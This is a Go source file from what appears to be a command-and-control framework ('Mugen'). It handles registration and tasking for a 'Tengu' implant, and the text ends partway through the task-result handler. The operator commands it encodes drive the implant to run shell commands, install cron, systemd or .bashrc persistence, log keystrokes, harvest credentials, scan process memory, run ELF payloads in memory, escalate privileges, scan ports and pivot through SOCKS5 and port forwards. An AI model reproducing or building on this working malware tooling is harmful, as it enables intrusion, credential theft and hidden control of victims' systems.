package agent

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	mathrand "math/rand"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"Mugen/pkg/common"
	"Mugen/pkg/common/parser"
	"Mugen/pkg/logger"
	"Mugen/pkg/logr"
	"golang.org/x/crypto/chacha20"
)

// ParseTenguRegisterRequest parses the Tengu INIT packet and returns an Agent instance.
// Packet format (all BE, from agent):
//
//	[Hostname: len(4B)+bytes][Username: len(4B)+bytes][InternalIP: len(4B)+bytes]
//	[OS: len(4B)+bytes][ProcessName: len(4B)+bytes][PID: 4B][Sleep: 4B][Jitter: 4B]
//	[ChaCha20Key: 32B raw]
func ParseTenguRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP string) *Agent {
	if !Parser.CanIRead([]parser.ReadType{
		parser.ReadBytes, parser.ReadBytes, parser.ReadBytes,
		parser.ReadBytes, parser.ReadBytes,
		parser.ReadInt32, parser.ReadInt32, parser.ReadInt32,
	}) {
		logger.Debug("Tengu register: not enough data in packet")
		return nil
	}

	var (
		Hostname    = string(Parser.ParseBytes())
		Username    = string(Parser.ParseBytes())
		InternalIP  = string(Parser.ParseBytes())
		OS          = string(Parser.ParseBytes())
		ProcessName = string(Parser.ParseBytes())
		PID         = Parser.ParseInt32()
		Sleep       = Parser.ParseInt32()
		Jitter      = Parser.ParseInt32()
	)

	Session := &Agent{
		Active:     true,
		SessionDir: "",
		Info:       new(AgentInfo),
	}

	Session.NameID = fmt.Sprintf("%08x", AgentID)
	Session.DisplayID = "TU-" + Session.NameID
	Session.Info.MagicValue = TENGU_MAGIC_VALUE
	Session.Info.Hostname = Hostname
	Session.Info.Username = Username
	Session.Info.InternalIP = InternalIP
	Session.Info.OSVersion = OS
	Session.Info.ProcessName = ProcessName
	Session.Info.ProcessPID = PID
	Session.Info.SleepDelay = Sleep
	Session.Info.SleepJitter = Jitter
	Session.Info.FirstCallIn = time.Now().Format("02/01/2006 15:04:05")
	Session.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05")
	Session.Info.ProcessArch = "x64"
	Session.Info.Elevated = "false"
	Session.Info.OSArch = "x64"
	Session.BackgroundCheck = false

	if ExternalIP != "" {
		Session.Info.ExternalIP = ExternalIP
	} else {
		Session.Info.ExternalIP = InternalIP
	}

	// Read the 32-byte ChaCha20 session key appended at the end of the INIT body.
	keyBytes := Parser.ParseAtLeastBytes(32)
	if len(keyBytes) == 32 {
		Session.Encryption.ChaCha20Key = make([]byte, 32)
		copy(Session.Encryption.ChaCha20Key, keyBytes)
	} else {
		logger.Debug("Tengu register: missing or short ChaCha20 key, proceeding without encryption")
	}

	return Session
}

// BuildTenguMessage builds a response payload for Tengu agents without AES encryption.
// Format per job: [Command: 4B LE][RequestID: 4B LE][DataSize: 4B LE][raw data]
func BuildTenguMessage(Jobs []Job) []byte {
	var (
		PayloadPackage     []byte
		DataPayload        []byte
		PayloadPackageSize = make([]byte, 4)
		RequestID          = make([]byte, 4)
		DataCommandID      = make([]byte, 4)
	)

	for _, job := range Jobs {
		DataPayload = nil

		for _, item := range job.Data {
			switch v := item.(type) {
			case int:
				tmp := make([]byte, 4)
				binary.LittleEndian.PutUint32(tmp, uint32(v))
				DataPayload = append(DataPayload, tmp...)
			case uint32:
				tmp := make([]byte, 4)
				binary.LittleEndian.PutUint32(tmp, v)
				DataPayload = append(DataPayload, tmp...)
			case string:
				tmp := make([]byte, 4)
				s := v
				if !strings.HasSuffix(s, "\x00") {
					s += "\x00"
				}
				binary.LittleEndian.PutUint32(tmp, uint32(len(s)))
				DataPayload = append(DataPayload, tmp...)
				DataPayload = append(DataPayload, []byte(s)...)
			case []byte:
				tmp := make([]byte, 4)
				binary.LittleEndian.PutUint32(tmp, uint32(len(v)))
				DataPayload = append(DataPayload, tmp...)
				DataPayload = append(DataPayload, v...)
			}
		}

		binary.LittleEndian.PutUint32(DataCommandID, job.Command)
		PayloadPackage = append(PayloadPackage, DataCommandID...)

		binary.LittleEndian.PutUint32(RequestID, job.RequestID)
		PayloadPackage = append(PayloadPackage, RequestID...)

		binary.LittleEndian.PutUint32(PayloadPackageSize, uint32(len(DataPayload)))
		PayloadPackage = append(PayloadPackage, PayloadPackageSize...)

		if len(DataPayload) > 0 {
			PayloadPackage = append(PayloadPackage, DataPayload...)
		}
	}

	return PayloadPackage
}

// TenguTeamserverTaskPrepare handles text commands from the operator for Tengu sessions.
// All Tengu commands are sent as raw text strings through the Teamserver path.
func (a *Agent) TenguTeamserverTaskPrepare(Command string, TaskIDStr string, Console func(AgentID string, Message map[string]string)) error {
	parts := strings.Fields(Command)
	if len(parts) == 0 {
		return nil
	}

	// Parse the TaskID from the client to use as RequestID for response tracking.
	var reqID uint32
	if parsed, err := strconv.ParseInt(TaskIDStr, 16, 64); err == nil {
		reqID = uint32(parsed)
	} else {
		reqID = mathrand.Uint32()
	}

	var job *Job

	switch parts[0] {

	case "task":
		// Route meta-commands to the generic teamserver handler.
		return a.TeamserverTaskPrepare(Command, Console)

	case "shell":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: shell <command>"})
			return nil
		}
		cmd := strings.Join(parts[1:], " ")
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to shell: " + cmd})
		job = &Job{
			Command:     TENGU_SHELL,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{cmd},
		}

	case "sleep":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: sleep <seconds> [jitter%]"})
			return nil
		}
		delay := 0
		jitter := 0
		fmt.Sscanf(parts[1], "%d", &delay)
		if len(parts) >= 3 {
			fmt.Sscanf(parts[2], "%d", &jitter)
		}
		Console(a.NameID, map[string]string{
			"Type":    "Info",
			"Message": fmt.Sprintf("Tasked Tengu to sleep %ds with %d%% jitter", delay, jitter),
		})
		job = &Job{
			Command:     COMMAND_SLEEP,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{delay, jitter},
		}

	case "exit":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to exit"})
		job = &Job{
			Command:     COMMAND_EXIT,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "pwd":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to print working directory"})
		job = &Job{
			Command:     TENGU_PWD,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "ls;ui":
		path := "."
		if len(parts) >= 2 {
			path = strings.Join(parts[1:], " ")
		}
		job = &Job{
			Command:     TENGU_LS_UI,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{path},
		}

	case "ps;ui":
		job = &Job{
			Command:     TENGU_PS_UI,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "ls":
		path := "."
		if len(parts) >= 2 {
			path = strings.Join(parts[1:], " ")
		}
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to list: " + path})
		job = &Job{
			Command:     TENGU_LS,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{path},
		}

	case "cd":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: cd <path>"})
			return nil
		}
		path := strings.Join(parts[1:], " ")
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to cd: " + path})
		job = &Job{
			Command:     TENGU_CD,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{path},
		}

	case "download":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: download <remote_path>"})
			return nil
		}
		path := strings.Join(parts[1:], " ")
		msg := map[string]string{"Type": "Info", "Message": "Tasked Tengu to download: " + path}
		mergeTransfer(msg, transferProgressMap("t-"+TaskIDStr, "down", path, "run", 0, 0))
		Console(a.NameID, msg)
		a.TrackTenguXfer(reqID, "t-"+TaskIDStr, "down", path, 0)
		job = &Job{
			Command:     TENGU_DOWNLOAD,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{path},
		}

	case "upload":
		if len(parts) < 3 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: upload <local_path> <remote_path>"})
			return nil
		}
		localPath := parts[1]
		remotePath := parts[2]
		data, err := os.ReadFile(localPath)
		if err != nil {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Failed to read local file: " + err.Error()})
			return nil
		}
		up := transferProgressMap("t-"+TaskIDStr, "up", remotePath, "run", 0, int64(len(data)))
		up["Type"] = "Info"
		up["Message"] = fmt.Sprintf("Tasked Tengu to upload %d bytes -> %s", len(data), remotePath)
		Console(a.NameID, up)
		a.TrackTenguXfer(reqID, "t-"+TaskIDStr, "up", remotePath, int64(len(data)))
		job = &Job{
			Command:     TENGU_UPLOAD,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{remotePath, data},
		}

	case "cat":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: cat <path>"})
			return nil
		}
		path := strings.Join(parts[1:], " ")
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to cat: " + path})
		job = &Job{
			Command:     TENGU_CAT,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{path},
		}

	case "mkdir":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: mkdir <path>"})
			return nil
		}
		path := strings.Join(parts[1:], " ")
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to mkdir: " + path})
		job = &Job{
			Command:     TENGU_MKDIR,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{path},
		}

	case "rm":
		recursive := 0
		pathIdx := 1
		if len(parts) >= 2 && (parts[1] == "-r" || parts[1] == "-rf" || parts[1] == "-fr") {
			recursive = 1
			pathIdx = 2
		}
		if pathIdx >= len(parts) {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: rm [-r] <path>"})
			return nil
		}
		path := strings.Join(parts[pathIdx:], " ")
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to rm: " + path})
		job = &Job{
			Command:     TENGU_RM,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{path, recursive},
		}

	case "ps":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to list processes"})
		job = &Job{
			Command:     TENGU_PS,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "id":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to get user identity"})
		job = &Job{
			Command:     TENGU_ID,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "env":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to list environment"})
		job = &Job{
			Command:     TENGU_ENV,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "ifconfig":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to get network interfaces"})
		job = &Job{
			Command:     TENGU_IFCONFIG,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "chmod":
		if len(parts) < 3 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: chmod <octal_mode> <path>"})
			return nil
		}
		modeVal, err := strconv.ParseUint(parts[1], 8, 32)
		if err != nil {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Invalid octal mode: " + parts[1]})
			return nil
		}
		path := strings.Join(parts[2:], " ")
		Console(a.NameID, map[string]string{
			"Type":    "Info",
			"Message": fmt.Sprintf("Tasked Tengu to chmod %s %s", parts[1], path),
		})
		job = &Job{
			Command:     TENGU_CHMOD,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{path, uint32(modeVal)},
		}

	case "cp":
		if len(parts) < 3 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: cp <src> <dst>"})
			return nil
		}
		src := parts[1]
		dst := parts[2]
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to cp: " + src + " -> " + dst})
		job = &Job{
			Command:     TENGU_CP,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{src, dst},
		}

	case "kill":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: kill <pid>"})
			return nil
		}
		pid, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Invalid PID: " + parts[1]})
			return nil
		}
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to kill PID " + parts[1]})
		job = &Job{
			Command:     TENGU_KILL,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{uint32(pid)},
		}

	case "inline-execute", "bof":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{
				"Type":    "Error",
				"Message": "Usage: " + parts[0] + " <path.o> [str:value] [int:123] [short:5] [bin:hexdata]",
			})
			return nil
		}
		bofPath := parts[1]
		if strings.HasPrefix(bofPath, "~/") {
			if home, err := os.UserHomeDir(); err == nil {
				bofPath = filepath.Join(home, bofPath[2:])
			}
		}
		objData, err := os.ReadFile(bofPath)
		if err != nil {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Failed to read BOF: " + err.Error()})
			return nil
		}
		argsBuf := packBofArgs(parts[2:])
		Console(a.NameID, map[string]string{
			"Type": "Info",
			"Message": fmt.Sprintf("Tasked Tengu to execute BOF %s (%d bytes, %d bytes args)",
				filepath.Base(bofPath), len(objData), len(argsBuf)),
		})
		job = &Job{
			Command:     TENGU_BOF,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{objData, argsBuf},
		}

	case "netstat":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to list network connections"})
		job = &Job{
			Command:     TENGU_NETSTAT,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "arp":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to list ARP table"})
		job = &Job{
			Command:     TENGU_ARP,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "route":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to list routing table"})
		job = &Job{
			Command:     TENGU_ROUTE,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "persist":
		if len(parts) < 3 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: persist <cron|systemd|bash> <payload_path> [cron_interval]"})
			return nil
		}
		method := parts[1]
		path := parts[2]
		switch method {
		case "cron":
			interval := "*/5 * * * *"
			if len(parts) >= 4 {
				interval = strings.Join(parts[3:], " ")
			}
			Console(a.NameID, map[string]string{"Type": "Info", "Message": fmt.Sprintf("Tasked Tengu cron persistence: %s [%s]", path, interval)})
			job = &Job{
				Command:     TENGU_PERSIST_CRON,
				RequestID:   reqID,
				TaskID:      TaskIDStr,
				CommandLine: Command,
				Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
				Data:        []interface{}{path, interval},
			}
		case "systemd":
			Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu systemd persistence: " + path})
			job = &Job{
				Command:     TENGU_PERSIST_SYS,
				RequestID:   reqID,
				TaskID:      TaskIDStr,
				CommandLine: Command,
				Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
				Data:        []interface{}{path},
			}
		case "bash":
			Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu .bashrc persistence: " + path})
			job = &Job{
				Command:     TENGU_PERSIST_BASH,
				RequestID:   reqID,
				TaskID:      TaskIDStr,
				CommandLine: Command,
				Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
				Data:        []interface{}{path},
			}
		default:
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Unknown persistence method: " + method + ". Use: cron, systemd, bash"})
			return nil
		}

	case "screenshot":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to capture screenshot"})
		job = &Job{
			Command:     TENGU_SCREENSHOT,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "whoami":
		flag := ""
		if len(parts) > 1 && parts[1] == "/all" {
			flag = "/all"
		}
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to run whoami"})
		job = &Job{
			Command:     TENGU_WHOAMI,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{flag},
		}

	case "keylog":
		duration := "30"
		if len(parts) > 1 {
			duration = parts[1]
		}
		Console(a.NameID, map[string]string{
			"Type":    "Info",
			"Message": fmt.Sprintf("Tasked Tengu to keylog for %s seconds", duration),
		})
		job = &Job{
			Command:     TENGU_KEYLOG,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{duration},
		}

	case "procdump":
		pid := 0
		if len(parts) > 1 && parts[1] != "all" {
			fmt.Sscanf(parts[1], "%d", &pid)
		}
		msg := "Tasked Tengu to scan all accessible process memory"
		if pid > 0 {
			msg = fmt.Sprintf("Tasked Tengu to scan memory of PID %d", pid)
		}
		Console(a.NameID, map[string]string{"Type": "Info", "Message": msg})
		job = &Job{
			Command:     TENGU_PROCDUMP,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{pid},
		}

	case "portscan":
		if len(parts) < 3 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: portscan <target> <ports> [timeout_ms]"})
			return nil
		}
		target := parts[1]
		portsArg := parts[2]
		timeoutMs := 800
		if len(parts) >= 4 {
			fmt.Sscanf(parts[3], "%d", &timeoutMs)
		}
		Console(a.NameID, map[string]string{
			"Type":    "Info",
			"Message": fmt.Sprintf("Tasked Tengu to scan %s ports %s (timeout %dms)", target, portsArg, timeoutMs),
		})
		job = &Job{
			Command:     TENGU_PORTSCAN,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{target, portsArg, timeoutMs},
		}

	case "harvest":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to harvest credentials"})
		job = &Job{
			Command:     TENGU_HARVEST,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "privesc":
		Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to run privilege escalation recon"})
		job = &Job{
			Command:     TENGU_PRIVESC,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{},
		}

	case "memfd":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: memfd <local_elf_path> [args...]"})
			return nil
		}
		elfData, err := os.ReadFile(parts[1])
		if err != nil {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Failed to read ELF: " + err.Error()})
			return nil
		}
		args := ""
		if len(parts) >= 3 {
			args = strings.Join(parts[2:], " ")
		} else {
			args = filepath.Base(parts[1])
		}
		Console(a.NameID, map[string]string{
			"Type":    "Info",
			"Message": fmt.Sprintf("Tasked Tengu to execute %s in-memory (%d bytes)", filepath.Base(parts[1]), len(elfData)),
		})
		job = &Job{
			Command:     TENGU_MEMFD,
			RequestID:   reqID,
			TaskID:      TaskIDStr,
			CommandLine: Command,
			Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
			Data:        []interface{}{elfData, args},
		}

	case "rportfwd":
		if len(parts) < 2 {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: rportfwd <add <bind_port> <host> <port>|rm <bind_port>|list>"})
			return nil
		}
		subCmd := parts[1]
		consoleFunc := func(msgType, msg string) {
			Console(a.NameID, map[string]string{"Type": msgType, "Message": msg})
		}
		if a.TenguRportfwd == nil {
			a.TenguRportfwd = NewTenguRportfwd(a, consoleFunc)
		}
		switch subCmd {
		case "list":
			Console(a.NameID, map[string]string{"Type": "Good", "Output": a.TenguRportfwd.ListRules()})
		case "rm":
			if len(parts) < 3 {
				Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: rportfwd rm <bind_port>"})
				return nil
			}
			var bindPort int
			fmt.Sscanf(parts[2], "%d", &bindPort)
			if a.TenguRportfwd.RemoveRule(bindPort) {
				if a.TunnelRemove != nil {
					a.TunnelRemove("rportfwd", bindPort)
				}
				Console(a.NameID, map[string]string{"Type": "Good", "Message": fmt.Sprintf("rportfwd rule for port %d removed", bindPort)})
			} else {
				Console(a.NameID, map[string]string{"Type": "Error", "Message": fmt.Sprintf("No rule for port %d", bindPort)})
			}
		case "add":
			if len(parts) < 5 {
				Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: rportfwd add <bind_port> <internal_host> <internal_port>"})
				return nil
			}
			var bindPort, internalPort int
			fmt.Sscanf(parts[2], "%d", &bindPort)
			internalHost := parts[3]
			fmt.Sscanf(parts[4], "%d", &internalPort)
			if err := a.TenguRportfwd.AddRule(bindPort, internalHost, internalPort); err != nil {
				Console(a.NameID, map[string]string{"Type": "Error", "Message": "Failed to add rportfwd rule: " + err.Error()})
			} else {
				if a.TunnelSave != nil {
					a.TunnelSave("rportfwd", bindPort, internalHost, internalPort)
				}
				Console(a.NameID, map[string]string{
					"Type":    "Good",
					"Message": fmt.Sprintf("rportfwd listening on 0.0.0.0:%d -> %s:%d", bindPort, internalHost, internalPort),
				})
			}
		default:
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: rportfwd <add|rm|list>"})
		}
		return nil

	case "pivot":
		if len(parts) < 3 || parts[1] != "tcp" {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: pivot tcp <listen <port>|disconnect <child_id>>"})
			return nil
		}
		switch parts[2] {
		case "listen":
			if len(parts) < 4 {
				Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: pivot tcp listen <port>"})
				return nil
			}
			port := 0
			fmt.Sscanf(parts[3], "%d", &port)
			Console(a.NameID, map[string]string{"Type": "Info", "Message": fmt.Sprintf("Tasked Tengu to listen for TCP pivot on port %d", port)})
			job = &Job{
				Command:     TENGU_PIVOT_TCP_LISTEN,
				RequestID:   reqID,
				TaskID:      TaskIDStr,
				CommandLine: Command,
				Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
				Data:        []interface{}{port},
			}
		case "disconnect":
			if len(parts) < 4 {
				Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: pivot tcp disconnect <child_id>"})
				return nil
			}
			Console(a.NameID, map[string]string{"Type": "Info", "Message": "Tasked Tengu to disconnect TCP pivot child: " + parts[3]})
			// Send a TENGU_PIVOT_TCP_DISCONN job to tell the parent to close the child socket.
			var childID uint64
			fmt.Sscanf(parts[3], "%x", &childID)
			job = &Job{
				Command:     TENGU_PIVOT_TCP_DISCONN,
				RequestID:   reqID,
				TaskID:      TaskIDStr,
				CommandLine: Command,
				Created:     time.Now().UTC().Format("02/01/2006 15:04:05"),
				Data:        []interface{}{uint32(childID)},
			}
		default:
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: pivot tcp <listen <port>|disconnect <child_id>>"})
			return nil
		}

	case "socks5":
		if len(parts) < 2 || (parts[1] != "start" && parts[1] != "stop") {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Usage: socks5 <start [port]|stop>"})
			return nil
		}
		if parts[1] == "stop" {
			if a.TenguSocks5 != nil {
				if a.TunnelRemove != nil {
					a.TunnelRemove("socks5", a.TenguSocks5.Port)
				}
				a.TenguSocks5.Stop()
				a.TenguSocks5 = nil
			}
			Console(a.NameID, map[string]string{"Type": "Good", "Message": "SOCKS5 proxy stopped"})
			return nil
		}
		// start
		port := 1080
		if len(parts) >= 3 {
			fmt.Sscanf(parts[2], "%d", &port)
		}
		consoleFunc := func(msgType, msg string) {
			Console(a.NameID, map[string]string{"Type": msgType, "Message": msg})
		}
		if a.TenguSocks5 != nil {
			a.TenguSocks5.Stop()
		}
		a.TenguSocks5 = NewTenguSocks5(a, consoleFunc)
		if err := a.TenguSocks5.Start(port); err != nil {
			Console(a.NameID, map[string]string{"Type": "Error", "Message": "Failed to start SOCKS5: " + err.Error()})
			a.TenguSocks5 = nil
		} else {
			if a.TunnelSave != nil {
				a.TunnelSave("socks5", port, "", 0)
			}
			Console(a.NameID, map[string]string{
				"Type":    "Good",
				"Message": fmt.Sprintf("SOCKS5 proxy listening on 127.0.0.1:%d (use proxychains or similar)", port),
			})
		}
		return nil

	default:
		Console(a.NameID, map[string]string{
			"Type":    "Error",
			"Message": "Unknown command: " + parts[0] + ". Type 'help' for available commands.",
		})
		return nil
	}

	if job != nil {
		a.AddJobToQueue(*job)
	}

	return nil
}

// packBofArgs packs typed arguments for a Tengu ELF BOF.
// Each arg is prefixed with [type: 2B LE][len: 4B LE].
// Types: str=2 (nul-terminated), int=1, short=0, bin=8.
// Format: str:hello  int:1234  short:5  bin:deadbeef
func packBofArgs(args []string) []byte {
	enc2 := func(v uint16) []byte { b := make([]byte, 2); binary.LittleEndian.PutUint16(b, v); return b }
	enc4 := func(v uint32) []byte { b := make([]byte, 4); binary.LittleEndian.PutUint32(b, v); return b }

	var buf []byte
	for _, arg := range args {
		switch {
		case strings.HasPrefix(arg, "int:"):
			var v int64
			fmt.Sscanf(arg[4:], "%d", &v)
			data := enc4(uint32(v))
			buf = append(buf, enc2(1)...)
			buf = append(buf, enc4(4)...)
			buf = append(buf, data...)

		case strings.HasPrefix(arg, "short:"):
			var v int64
			fmt.Sscanf(arg[6:], "%d", &v)
			data := enc2(uint16(v))
			buf = append(buf, enc2(0)...)
			buf = append(buf, enc4(2)...)
			buf = append(buf, data...)

		case strings.HasPrefix(arg, "bin:"):
			data, err := hex.DecodeString(arg[4:])
			if err == nil {
				buf = append(buf, enc2(8)...)
				buf = append(buf, enc4(uint32(len(data)))...)
				buf = append(buf, data...)
			}

		default:
			// str (with or without str: prefix)
			s := arg
			if strings.HasPrefix(s, "str:") {
				s = s[4:]
			}
			s += "\x00"
			buf = append(buf, enc2(2)...)
			buf = append(buf, enc4(uint32(len(s)))...)
			buf = append(buf, []byte(s)...)
		}
	}
	return buf
}

// TenguTaskDispatch handles incoming task results from a Tengu agent.
func (a *Agent) TenguTaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.Parser, teamserver TeamServer) {
	switch CommandID {

	case COMMAND_OUTPUT:
		var output string
		if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			output = string(Parser.ParseBytes())
		}

		isLsUi := false
		isPsUi := false
		isLs := false
		isPs := false
		for _, task := range a.Tasks {
			if task.RequestID == RequestID {
				switch task.Command {
				case TENGU_LS_UI:
